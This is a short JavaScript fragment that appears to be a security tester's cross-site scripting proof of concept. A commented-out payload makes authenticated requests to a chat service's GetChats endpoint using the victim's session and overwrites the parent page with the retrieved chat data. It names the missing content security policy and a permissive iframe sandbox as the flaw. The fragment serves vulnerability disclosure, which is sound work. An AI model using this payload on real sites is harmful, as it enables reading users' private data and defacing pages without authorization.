...
console.info('hello, i am vulnerable to XSS');

/*
// PoC after 10 seconds
setTimeout(function() {
  fetch('/rpc/public/textql.rpc.public.chat.ChatService/GetChats', {
    method: 'POST',
    ...
    // Replace parent page
    parent.document.body.innerHTML = '<div style="font-family:monospace;padding:40px;background:#1a1a2e;color:#e0e0e0;min-height:100vh">'
      + '<h1 style="color:#ff4444">⚠️ XSS Proof of Concept — steseide was here</h1>'
      + '<p style="color:#ff8888;font-size:18px">Attacker-controlled script executed on <b>' + window.origin + '</b></p>'
      + '<p style="color:#ffaa00;font-size:16px">No Content Security Policy on iframe response. '
      + 'sandbox="allow-scripts allow-same-origin" on same domain = full session access.</p>'
      + '<hr style="border-color:#444">'
      + '<h2 style="color:#ff6666">Exfiltration demo — authenticated API response (GetChats)</h2>'
      + '<p style="color:#aaa">Data below retrieved using victim\'s session cookies via same-origin fetch. '
      + 'No cookies were read directly (HttpOnly). The script simply makes authenticated requests as the user.</p>'
      + '<pre style="background:#0d0d1a;padding:20px;border:1px solid #333;overflow:auto;max-height:60vh;color:#00ff88">'
      + JSON.stringify(JSON.parse(data), null, 2).replace(/</g, '&lt;').replace(/>/g, '>')
      + '</pre>'
      + '<hr style="border-color:#444">'
      + '<p style="color:#888;font-size:12px">steseide — RBKS Security Testing — April 2026. '
      + 'No data was exfiltrated. This PoC runs entirely in the browser.</p>'
      + '</div>';
  });
}, 2000);
*/
